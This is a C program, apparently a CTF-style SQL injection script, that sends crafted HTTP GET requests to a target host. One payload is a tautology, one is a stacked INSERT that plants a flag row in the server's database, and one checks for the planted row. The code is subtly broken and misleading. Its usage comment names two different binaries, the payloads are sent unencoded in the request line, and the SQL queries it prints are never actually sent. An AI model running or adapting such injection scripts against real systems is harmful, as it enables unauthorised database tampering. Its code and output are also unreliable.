/*
Usage:
  1) Compile: gcc 81_http.c -o 81_http
  2) Run: ./81_https <target> [port] (port is optional, defaults to 81)
  3) Example: ./81_https 127.0.0.1
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#endif

int main(int argc, char *argv[]) {
    char input[128];
    strcpy(input, "anything' OR '1'='1");
    char query[128];
    sprintf(query, "SELECT * FROM users WHERE name='%s'", input);

    if (argc < 2) {
        printf("Missing arguments. Please see usage at top.\n");
        printf("Vulnerable query (example): %s\n", query);
        return 1;
    }

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }
#endif

    char *target = argv[1];
    int port = 81;
    if (argc == 3) port = atoi(argv[2]);
    struct hostent *he = gethostbyname(target);
    if (!he) {
        printf("Host lookup failed.\n");
        return 1;
    }

    struct sockaddr_in server;
    int sockfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Socket creation error: %s\n", strerror(errno));
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    memcpy(&server.sin_addr, he->h_addr, he->h_length);

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char request[512];
    sprintf(request, "GET /test?user=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", input, target);
    if (send(sockfd, request, strlen(request), 0) < 0) {
        printf("Send error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char response[2048];
    memset(response, 0, sizeof(response));
    int bytes = recv(sockfd, response, sizeof(response) - 1, 0);
    if (bytes < 0) {
        printf("Receive error: %s\n", strerror(errno));
    } else {
        printf("Vulnerable query (attempted): %s\n", query);
        printf("HTTP response:\n%s\n", response);
        if (strstr(response, "error") || strstr(response, "syntax")) {
            printf("Explanation: The server responded with an error, potential SQL injection discovered.\n");
            printf("Capture the Flag: CTF{SQL_INJECTION_FOUND}\n");
        } else {
            printf("Explanation: No direct error detected. Further testing needed.\n");
        }
    }

#ifdef _WIN32
    closesocket(sockfd);
#else
    close(sockfd);
#endif

    strcpy(input, "anything'); INSERT INTO ctf_flags(flag) VALUES('CTF{EVERLASTING_FLAG}'); -- ");
    sprintf(query, "SELECT * FROM users WHERE name='%s'", input);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Socket creation error: %s\n", strerror(errno));
        return 1;
    }

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char request2[512];
    sprintf(request2, "GET /test?user=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", input, target);
    if (send(sockfd, request2, strlen(request2), 0) < 0) {
        printf("Send error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char response2[2048];
    memset(response2, 0, sizeof(response2));
    int bytes2 = recv(sockfd, response2, sizeof(response2) - 1, 0);
    if (bytes2 < 0) {
        printf("Receive error: %s\n", strerror(errno));
    } else {
        printf("Persistent injection attempt (planted): %s\n", query);
        printf("HTTP response:\n%s\n", response2);
    }

#ifdef _WIN32
    closesocket(sockfd);
#else
    close(sockfd);
#endif

    strcpy(input, "anything' OR '1'='1");
    sprintf(query, "SELECT flag FROM ctf_flags");

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Socket creation error: %s\n", strerror(errno));
        return 1;
    }

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char request3[512];
    sprintf(request3, "GET /test?checkFlags=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", input, target);
    if (send(sockfd, request3, strlen(request3), 0) < 0) {
        printf("Send error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char response3[2048];
    memset(response3, 0, sizeof(response3));
    int bytes3 = recv(sockfd, response3, sizeof(response3) - 1, 0);
    if (bytes3 < 0) {
        printf("Receive error: %s\n", strerror(errno));
    } else {
        printf("Persistent check query (attempted): %s\n", query);
        printf("HTTP response:\n%s\n", response3);
        if (strstr(response3, "CTF{EVERLASTING_FLAG}")) {
            printf("Flag found on server: CTF{EVERLASTING_FLAG}\n");
        } else {
            printf("No persistent flag detected or server blocked insertion.\n");
        }
    }

#ifdef _WIN32
    closesocket(sockfd);
#else
    close(sockfd);
#endif

    return 0;
}